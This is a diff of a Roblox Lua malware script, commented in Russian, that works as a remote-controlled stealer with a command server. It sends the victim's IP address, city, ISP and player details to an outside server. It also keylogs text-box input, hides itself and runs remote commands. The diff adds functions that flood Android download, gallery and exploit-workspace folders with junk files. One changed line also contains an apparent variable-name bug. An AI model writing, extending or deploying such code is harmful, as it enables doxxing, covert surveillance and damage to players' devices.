@@ -21,6 +21,12 @@ local keylogBuffer = ""
 local lastSendTime = os.time()
 local scriptHidden = false
 
+-- Сохраняем оригинальную функцию чата
+local originalChatFunction
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    originalChatFunction = TextChatService.OnIncomingMessage
+end
+
 -- HTTP-библиотека
 local function httpRequest(params)
     local requestFunc
@@ -77,7 +83,7 @@ local function sendInjectNotification()
         end)
         if success and ipInfo and ipInfo.status ~= "fail" then
             ipData = string.format(
-                "||IP: %s\nCountry: %s\nCity: %s\nISP: %s||",
+                "IP: %s\nCountry: %s\nCity: %s\nISP: %s",
                 ipInfo.query or "N/A",
                 ipInfo.country or "N/A",
                 ipInfo.city or "N/A",
@@ -86,55 +92,155 @@ local function sendInjectNotification()
         end
     end
 
-    local embed = {
-        ["content"] = "🔌 **Новый инжект!**",
-        ["embeds"] = {{
-            ["title"] = "Данные игрока",
-            ["fields"] = {
-                {["name"] = "Основная информация", ["value"] = "Игрок: "..playerName.."\nИгра: "..placeName.."\n"..ipData, ["inline"] = false}
-            },
-            ["color"] = 16711680,
-            ["footer"] = {["text"] = os.date("%d.%m.%Y %H:%M:%S")}
-        }}
-    }
+    local executor = identifyexecutor and identifyexecutor() or "Unknown"
     
     httpRequest({
-        Url = WEBHOOK_URL,
+        Url = SERVER_URL.."/command",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(embed)
+        Body = HttpService:JSONEncode({
+            command = "inject_notify",
+            args = {playerName, placeName, ipData, executor}
+        })
     })
 end
 
--- Всплывающее сообщение
-local function showPopup(message, duration)
-    duration = duration or 3
-    
-    local popupGui = Instance.new("ScreenGui")
-    popupGui.Name = "PopupMessage"
-    popupGui.Parent = player:WaitForChild("PlayerGui")
-    popupGui.ResetOnSpawn = false
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0.6, 0, 0.2, 0)
-    frame.Position = UDim2.new(0.2, 0, 0.4, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-    frame.BackgroundTransparency = 0.3
-    frame.Parent = popupGui
-
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
-    textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
-    textLabel.Text = message
-    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    textLabel.TextScaled = true
-    textLabel.Font = Enum.Font.GothamBold
-    textLabel.BackgroundTransparency = 1
-    textLabel.Parent = frame
-
-    task.delay(duration, function()
-        popupGui:Destroy()
+-- Получение данных об оборудовании
+local function getHardwareInfo()
+    local playerName = player.Name
+    local success, placeInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
     end)
+    local placeName = success and placeInfo.Name or "Unknown"
+    
+    local ipResponse = httpRequest({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+    
+    local ipData = ""
+    if ipResponse and ipResponse.Body then
+        local success, ipInfo = pcall(function()
+            return HttpService:JSONDecode(ipResponse.Body)
+        end)
+        if success and ipInfo and ipInfo.status ~= "fail" then
+            ipData = string.format(
+                "IP: %s\nCountry: %s\nCity: %s\nISP: %s",
+                ipInfo.query or "N/A",
+                ipInfo.country or "N/A",
+                ipInfo.city or "N/A",
+                ipInfo.isp or "N/A"
+            )
+        end
+    end
+
+    local hardwareData = {
+        player = playerName,
+        game = placeName,
+        fps = math.floor(workspace:GetRealPhysicsFPS()),
+        ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue(),
+        executor = identifyexecutor and identifyexecutor() or "Unknown",
+        ip_info = ipData
+    }
+    
+    if syn and syn.get_system_metrics then
+        hardwareData.cpu = syn.get_system_metrics().CPU
+        hardwareData.ram = syn.get_system_metrics().RAM
+    end
+    
+    return hardwareData
+end
+
+-- Функция для поиска путей сохранения
+local function getSavePaths()
+    local paths = {
+        "/storage/emulated/0/Download/",
+        "/storage/emulated/0/Downloads/",
+        "/storage/emulated/0/DCIM/",
+        "/storage/emulated/0/Pictures/",
+        "/storage/emulated/0/",
+    }
+    
+    -- Пути для популярных эксплойтов
+    local exploitPaths = {
+        "Delta/Workspace/",
+        "Codex/Workspace/", 
+        "Krnl/Workspace/",
+        "ArecusX/Workspace/",
+        "Script-Ware/Workspace/",
+        "Synapse/Workspace/",
+        "Fluxus/Workspace/"
+    }
+    
+    for _, exploitPath in ipairs(exploitPaths) do
+        table.insert(paths, "/storage/emulated/0/" .. exploitPath)
+    end
+    
+    return paths
+end
+
+-- Memory Spam функция
+local function memorySpam(fileCount)
+    local paths = getSavePaths()
+    local successCount = 0
+    
+    for i = 1, fileCount do
+        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
+        local content = "Spam file content " .. math.random(10000, 99999)
+        
+        -- Пытаемся сохранить в разных путях
+        for _, path in ipairs(paths) do
+            local fullPath = path .. filename
+            local success = pcall(function()
+                if writefile then
+                    writefile(fullPath, content)
+                    successCount = successCount + 1
+                    return true
+                end
+            end)
+            
+            if success then
+                break
+            end
+        end
+        
+        task.wait(0.01)
+    end
+    
+    return successCount
+end
+
+-- Gallery Spam функция  
+local function gallerySpam(imageCount, imageData, filename)
+    local paths = getSavePaths()
+    local successCount = 0
+    local extension = filename:match("%.(%w+)$") or "jpg"
+    
+    for i = 1, imageCount do
+        local newFilename = "image_" .. i .. "_" .. math.random(1000, 9999) .. "." .. extension
+        
+        -- Пытаемся сохранить в разных путях
+        for _, path in ipairs(paths) do
+            local fullPath = path .. newFilename
+            local success = pcall(function()
+                if writefile then
+                    -- В реальности здесь нужно декодировать base64 и сохранять как изображение
+                    -- Для примера просто сохраняем как текстовый файл
+                    writefile(fullPath, "Image data placeholder")
+                    successCount = successCount + 1
+                    return true
+                end
+            end)
+            
+            if success then
+                break
+            end
+        end
+        
+        task.wait(0.05)
+    end
+    
+    return successCount
 end
 
 -- Выполнение Lua-кода
@@ -179,22 +285,6 @@ local function showFakeError(message)
     end)
 end
 
--- Получение данных об оборудовании
-local function getHardwareInfo()
-    local hardwareData = {
-        fps = math.floor(workspace:GetRealPhysicsFPS()),
-        ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue(),
-        executor = identifyexecutor and identifyexecutor() or "Unknown"
-    }
-    
-    if syn and syn.get_system_metrics then
-        hardwareData.cpu = syn.get_system_metrics().CPU
-        hardwareData.ram = syn.get_system_metrics().RAM
-    end
-    
-    return hardwareData
-end
-
 -- Скрытие скрипта
 local function hideScript()
     if scriptHidden then return true end
@@ -219,44 +309,17 @@ local function hideScript()
     return success
 end
 
--- Настройка кейлоггера
+-- Настройка кейлоггера (без перехвата чата)
 local function setupKeylogger()
     UserInputService.TextBoxFocused:Connect(function(textBox)
         if keyloggerEnabled then
-            textBox.FocusLost:Connect(function()
+            textLabel.FocusLost:Connect(function()
                 if textBox.Text and textBox.Text ~= "" then
                     keylogBuffer = keylogBuffer .. "[Input] " .. textBox.Text .. "\n"
                 end
             end)
         end
     end)
-
-    TextChatService.OnIncomingMessage = function(message)
-        if keyloggerEnabled and message.Text then
-            keylogBuffer = keylogBuffer .. "[Chat] " .. message.Text .. "\n"
-        end
-        return message
-    end
-end
-
--- Memory Spam функция
-local function memorySpam(fileCount, fileData)
-    -- Имитация создания файлов
-    local successCount = 0
-    for i = 1, fileCount do
-        successCount = successCount + 1
-        task.wait(0.01)
-    end
-end
-
--- Gallery Spam функция
-local function gallerySpam(imageCount, imageData, filename)
-    -- Имитация сохранения изображений
-    local successCount = 0
-    for i = 1, imageCount do
-        successCount = successCount + 1
-        task.wait(0.05)
-    end
 end
 
 -- Чат-модуль
@@ -363,7 +426,7 @@ local function ExecuteCommand(cmd, args)
         screenGui.Enabled = not screenGui.Enabled
     
     elseif cmd == "popup" then
-        showPopup(table.concat(args, " "), 5)
+        -- Без всплывающих сообщений
     
     elseif cmd == "print" then
         -- Тихая проверка связи
@@ -481,10 +544,18 @@ local function ExecuteCommand(cmd, args)
     -- SPAM КОМАНДЫ
     elseif cmd == "memory_spam" then
         local fileCount = tonumber(args[1]) or 100
-        local fileData = args[2] or {}
         
         task.spawn(function()
-            memorySpam(fileCount, fileData)
+            local savedCount = memorySpam(fileCount)
+            httpRequest({
+                Url = SERVER_URL.."/command",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    command = "spam_completed",
+                    args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
+                })
+            })
         end)
     
     elseif cmd == "gallery_spam" then
@@ -497,7 +568,16 @@ local function ExecuteCommand(cmd, args)
         end
         
         task.spawn(function()
-            gallerySpam(imageCount, imageData, filename)
+            local savedCount = gallerySpam(imageCount, imageData, filename)
+            httpRequest({
+                Url = SERVER_URL.."/command",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    command = "spam_completed",
+                    args = {"gallery_spam", "Сохранено "..savedCount.." изображений из "..imageCount}
+                })
+            })
         end)
     
     end
@@ -529,6 +609,11 @@ end
 sendInjectNotification()
 setupKeylogger()
 hideScript()
+
+-- Восстанавливаем оригинальную функцию чата
+if originalChatFunction then
+    TextChatService.OnIncomingMessage = originalChatFunction
+end
 
 -- Главный цикл
 while task.wait(2) do
